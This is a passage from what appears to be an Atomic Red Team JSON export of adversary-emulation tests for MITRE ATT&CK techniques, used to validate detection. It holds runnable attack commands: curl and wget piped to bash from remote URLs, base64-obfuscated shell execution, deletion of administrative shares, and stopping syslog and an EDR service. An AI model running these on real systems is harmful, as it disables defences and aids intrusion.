$RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "name": "powershell"}}, {"name": "Decompile Local CHM File", "auto_generated_guid": "20cb05e0-1fa5-406d-92c1-84da4ba01813", "description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n", "supported_platforms": ["windows"], "input_arguments": {"local_chm_file": {"description": "Local .chm payload", "type": "path", "default": "PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The payload must exist on disk at specified location (#{local_chm_file})\n", "prereq_command": "if (Test-Path \"#{local_chm_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{local_chm_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm\" -OutFile \"#{local_chm_file}\"\n"}], "executor": {"command": "hh.exe -decompile %temp% \"#{local_chm_file}\"\n", "cleanup_command": "del %temp%\\T1218.001.html >nul 2>&1\n", "name": "command_prompt"}}]}, "T1070.005": {"name": "Network Share Connection Removal", "technique_id": "attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c", "external_id": "T1070.005", "data_components": ["Process Creation", "Network Traffic Content", "User Account Authentication", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use)", "atomic_tests": [{"name": "Add Network Share", "auto_generated_guid": "14c38f32-6509-46d8-ab43-d53e32d2b131", "description": "Add a Network Share utilizing the command_prompt\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Share to add.", "type": "string", "default": "\\\\test\\share"}}, "executor": {"command": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n", "name": "command_prompt"}}, {"name": "Remove Network Share", "auto_generated_guid": "09210ad5-1ef2-4077-9ad3-7351e13e9222", "description": "Removes a Network Share utilizing the command_prompt\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Share to remove.", "type": "string", "default": "\\\\test\\share"}}, "executor": {"command": "net share #{share_name} /delete\n", "name": "command_prompt"}}, {"name": "Remove Network Share PowerShell", "auto_generated_guid": "0512d214-9512-4d22-bde7-f37e058259b3", "description": "Removes a Network Share utilizing PowerShell\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Share to remove.", "type": "string", "default": "\\\\test\\share"}}, "executor": {"command": "Remove-SmbShare -Name #{share_name}\nRemove-FileShare -Name #{share_name}\n", "name": "powershell"}}, {"name": "Disable Administrative Share Creation at Startup", "auto_generated_guid": "99c657aa-ebeb-4179-a665-69288fdd12b8", "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /f\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Remove Administrative Shares", "auto_generated_guid": "4299eff5-90f1-4446-b2f3-7f4f5cfd5d62", "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, \u201cMissing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n", "supported_platforms": ["windows"], "executor": {"command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete", "cleanup_command": "net share ADMIN$ /UNLIMITED >nul 2>&1\nnet share C$=C:\\ >nul 2>&1\nnet share IPC$ >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1090.003": {"name": "Multi-hop Proxy", "technique_id": "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d", "external_id": "T1090.003", "data_components": ["Network Traffic Flow", "Network Traffic Content", "Network Connection Creation"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d"], "description": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)\n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s WAN. Protocols such as ICMP may be used as a transport.", "atomic_tests": [{"name": "Psiphon", "auto_generated_guid": "14d55ca0-920e-4b44-8425-37eedd72b173", "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "The proxy settings backup file must exist on disk at $env:Temp\\proxy-backup.txt\n", "prereq_command": "if (Test-Path $env:Temp\\proxy-backup.txt) {exit 0} else {exit 1}\n", "get_prereq_command": "if(-not (test-path $env:Temp\\proxy-backup.txt)){\n$Proxy = (Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -ErrorAction Ignore).ProxyServer\nSet-Content $env:Temp\\proxy-backup.txt $Proxy}\n"}, {"description": "The Psiphon executable must exist in the Downloads folder\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\psiphon3.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\psiphon3.exe\" \n"}, {"description": "Batch file containing commands to run must be in src directory \n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1090.003\\src\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1090.003/src/Psiphon.bat\" -OutFile \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\"\n"}], "executor": {"name": "powershell", "command": "& \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\"\n", "cleanup_command": "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore\nif($null -ne $Proxy) \n{Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}\n"}}, {"name": "Tor Proxy Usage - Windows", "auto_generated_guid": "7b9d85e5-c4ce-4434-8060-d3de83595e69", "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n", "supported_platforms": ["windows"], "input_arguments": {"TorExe": {"description": "Location of tor.exe file.", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "tor.exe must be installed on the machine \n", "prereq_command": "if (Test-Path \"#{TorExe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor.zip\"\nexpand-archive -LiteralPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor\"\n"}], "executor": {"command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"#{TorExe}\"}'\nsleep -s 60\nstop-process -name \"tor\" | out-null\n", "name": "powershell", "elevation_required": false}}, {"name": "Tor Proxy Usage - Debian/Ubuntu", "auto_generated_guid": "5ff9d047-6e9c-4357-b39b-5cf89d9b59c7", "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Tor must be installed on the machine \n", "prereq_command": "if [ -x \"$(command -v tor --version)\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "sudo apt-get -y install tor\n"}], "executor": {"command": "sudo systemctl start tor \n", "cleanup_command": "sudo systemctl stop tor\n", "name": "sh", "elevation_required": true}}, {"name": "Tor Proxy Usage - MacOS", "auto_generated_guid": "12631354-fdbc-4164-92be-402527e748da", "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n", "supported_platforms": ["macos"], "dependency_executor_name": "sh", "dependencies": [{"description": "Tor must be installed on the machine \n", "prereq_command": "if [ -x \"$(command -v tor --version)\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "if [ ! -x \"$(command -v brew --version)\" ]; then /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)\"; fi\nbrew install tor\n"}], "executor": {"command": "osascript -e 'tell application \"Terminal\" to do script \"tor\"'\n", "cleanup_command": "killall tor > /dev/null 2>&1\n", "name": "sh"}}, {"name": "Tor Proxy Usage - FreeBSD", "auto_generated_guid": "550ec67d-a99e-408b-816a-689271b27d2a", "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Tor must be installed on the machine \n", "prereq_command": "if [ -x \"$(command -v tor --version)\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "pkg install -y tor\n"}], "executor": {"command": "sysrc tor_enable=\"YES\"\nservice tor start\n", "cleanup_command": "service tor stop\nsysrc -x tor_enable\n", "name": "sh", "elevation_required": true}}]}, "T1059.004": {"name": "Unix Shell", "technique_id": "attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56", "external_id": "T1059.004", "data_components": ["Process Creation", "Command Execution"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.", "atomic_tests": [{"name": "Create and Execute Bash Shell Script", "auto_generated_guid": "7e7ac3ed-f795-4fa5-b711-09d6fbe9b873", "description": "Creates and executes a simple sh script.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"script_path": {"description": "Script path", "type": "path", "default": "/tmp/art.sh"}}, "executor": {"command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > #{script_path}\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> #{script_path}\"\nchmod +x #{script_path}\nsh #{script_path}\n", "cleanup_command": "rm #{script_path}\n", "name": "sh"}}, {"name": "Command-Line Interface", "auto_generated_guid": "d0c88567-803d-4dca-99b4-7ce65e7b257c", "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\n", "cleanup_command": "rm /tmp/art-fish.txt\n", "name": "sh"}}, {"name": "Harvest SUID executable files", "auto_generated_guid": "46274fc6-08a7-4956-861b-24cbbaa0503c", "description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n", "supported_platforms": ["linux"], "input_arguments": {"autosuid": {"description": "Path to the autosuid shell script", "type": "path", "default": "PathToAtomicsFolder/T1059.004/src/AutoSUID.sh"}, "autosuid_url": {"description": "Path to download autosuid shell script", "type": "url", "default": "https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "AutoSUID must exist on disk at specified location (#{autosuid})\n", "prereq_command": "if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "curl --create-dirs #{autosuid_url} --output #{autosuid}\n"}], "executor": {"command": "chmod +x #{autosuid}\nbash #{autosuid}\n", "cleanup_command": "rm -rf #{autosuid}\n", "name": "sh"}}, {"name": "LinEnum tool execution", "auto_generated_guid": "a2b35a63-9df1-4806-9a4d-5fe0500845f2", "description": "LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n", "supported_platforms": ["linux"], "input_arguments": {"linenum": {"description": "Path to the LinEnum shell script", "type": "path", "default": "PathToAtomicsFolder/T1059.004/src/LinEnum.sh"}, "linenum_url": {"description": "Path to download LinEnum shell script", "type": "url", "default": "https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "LinnEnum must exist on disk at specified location (#{linenum})\n", "prereq_command": "if [ -f #{linenum} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "curl --create-dirs #{linenum_url} --output #{linenum}\n"}], "executor": {"command": "chmod +x #{linenum}\nbash #{linenum}\n", "cleanup_command": "rm -rf #{linenum}\n", "name": "sh"}}, {"name": "New script file in the tmp directory", "auto_generated_guid": "8cd1947b-4a54-41fb-b5ea-07d0ace04f81", "description": "An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "TMPFILE=$(mktemp)\necho \"id\" > $TMPFILE\nbash $TMPFILE\n", "cleanup_command": "rm $TMPFILE\nunset TMPFILE\n"}}, {"name": "What shell is running", "auto_generated_guid": "7b38e5cc-47be-44f0-a425-390305c76c17", "description": "An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "echo $0\nif $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi\nif $(printenv SHELL >/dev/null); then printenv SHELL; fi\n"}}, {"name": "What shells are available", "auto_generated_guid": "bf23c7dc-1004-4949-8262-4c1d1ef87702", "description": "An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "cat /etc/shells \n"}}, {"name": "Command line scripts", "auto_generated_guid": "b04ed73c-7d43-4dc8-b563-a2fc595cba1a", "description": "An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "command": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done\n"}}, {"name": "Obfuscated command line scripts", "auto_generated_guid": "5bec4cc8-f41e-437b-b417-33ff60acf9af", "description": "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "ART=$(echo -n \"id\" |base64 -w 0)\necho \"\\$ART=$ART\"\necho -n \"$ART\" |base64 -d |/bin/bash\nunset ART \n"}}, {"name": "Obfuscated command line scripts (freebsd)", "auto_generated_guid": "5dc1d9dd-f396-4420-b985-32b1c4f79062", "description": "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "ART=$(echo -n \"id\" |b64encode -r -)\necho \"\\$ART=$ART\"\necho -n \"$ART\" |b64decode -r |/bin/sh\nunset ART\n"}}, {"name": "Change login shell", "auto_generated_guid": "c7ac59cb-13cc-4622-81dc-6d2fee9bfac7", "description": "An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n", "supported_platforms": ["linux"], "dependencies": [{"description": "chsh - change login shell, must be installed\n", "prereq_command": "if [ -f /usr/bin/chsh ]; then echo \"exit 0\"; else echo \"exit 1\"; exit 1; fi\n", "get_prereq_command": "echo \"Automated installer not implemented yet, please install chsh manually\"\n"}], "executor": {"name": "bash", "elevation_required": true, "command": "useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n", "cleanup_command": "userdel art\n"}}, {"name": "Change login shell (freebsd)", "auto_generated_guid": "33b68b9b-4988-4caf-9600-31b7bf04227c", "description": "An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/sh shell, changes the users shell to sh, then deletes the art user. \n", "supported_platforms": ["linux"], "dependencies": [{"description": "chsh - change login shell, must be installed\n", "prereq_command": "if [ -f /usr/bin/chsh ]; then echo \"exit 0\"; else echo \"exit 1\"; exit 1; fi\n", "get_prereq_command": "echo \"Automated installer not implemented yet, please install chsh manually\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "pw useradd art -g wheel -s /bin/csh\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n", "cleanup_command": "rmuser -y art\n"}}, {"name": "Environment variable scripts", "auto_generated_guid": "bdaebd56-368b-4970-a523-f905ff4a8a51", "description": "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": false, "command": "export ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/bash\n", "cleanup_command": "unset ART\n"}}, {"name": "Environment variable scripts (freebsd)", "auto_generated_guid": "663b205d-2121-48a3-a6f9-8c9d4d87dfee", "description": "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/sh\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "export ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/sh\n", "cleanup_command": "unset ART\n"}}, {"name": "Detecting pipe-to-shell", "auto_generated_guid": "fca246a8-a585-4f28-a2df-6495973976a1", "description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n", "supported_platforms": ["linux"], "input_arguments": {"remote_url": {"description": "url of remote payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Check if running on a Debian based machine.\n", "prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n", "get_prereq_command": "apt update && apt install -y curl\n"}], "executor": {"name": "bash", "elevation_required": false, "command": "cd /tmp\ncurl -s #{remote_url}\nls -la /tmp/art.txt\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n", "cleanup_command": "rm /tmp/art.txt\n"}}, {"name": "Detecting pipe-to-shell (freebsd)", "auto_generated_guid": "1a06b1ec-0cca-49db-a222-3ebb6ef25632", "description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n", "supported_platforms": ["linux"], "input_arguments": {"remote_url": {"description": "url of remote payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if running on a Debian based machine.\n", "prereq_command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n", "get_prereq_command": "pkg update && pkg install -y curl\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "cd /tmp\ncurl -s #{remote_url}\nls -la /tmp/art.txt\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n", "cleanup_command": "rm /tmp/art.txt      \n"}}, {"name": "Current kernel information enumeration", "auto_generated_guid": "3a53734a-9e26-4f4b-ad15-059e767f5f14", "description": "An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "uname -srm\n"}}]}, "T1562.001": {"name": "Disable or Modify Tools", "technique_id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579", "external_id": "T1562.001", "data_components": ["Windows Registry Key Modification", "Windows Registry Key Deletion", "Command Execution", "Service Metadata", "Driver Load", "Host Status", "Process Termination"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9"], "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)", "atomic_tests": [{"name": "Disable syslog", "auto_generated_guid": "4ce786f8-e601-44b5-bfae-9ebb15a7d1c8", "description": "Disables syslog collection\n", "supported_platforms": ["linux"], "input_arguments": {"package_checker": {"description": "Package checking command for linux.", "type": "string", "default": "(rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed)"}, "package_installer": {"description": "Package installer command for linux. Default yum", "type": "string", "default": "(which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog)"}, "flavor_command": {"description": "Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog", "type": "string", "default": "systemctl stop rsyslog ; systemctl disable rsyslog"}, "cleanup_command": {"description": "Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on", "type": "string", "default": "systemctl start rsyslog ; systemctl enable rsyslog"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Package with rsyslog must be on system\n", "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n", "get_prereq_command": "sudo #{package_installer} \n"}], "executor": {"command": "#{flavor_command}\n", "cleanup_command": "#{cleanup_command}\n", "name": "sh", "elevation_required": true}}, {"name": "Disable syslog (freebsd)", "auto_generated_guid": "db9de996-441e-4ae0-947b-61b6871e2fdf", "description": "Disables syslog collection\n", "supported_platforms": ["linux"], "executor": {"command": "service syslogd stop\nsysrc syslogd_enable=\"NO\"\n", "cleanup_command": "sysrc syslogd_enable=\"YES\"\nservice syslogd start\n", "name": "sh", "elevation_required": true}}, {"name": "Disable Cb Response", "auto_generated_guid": "ae8943f7-0f8d-44de-962d-fbc2e2f03eb8", "description": "Disable the Cb Response service\n", "supported_platforms": ["linux"], "executor": {"command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  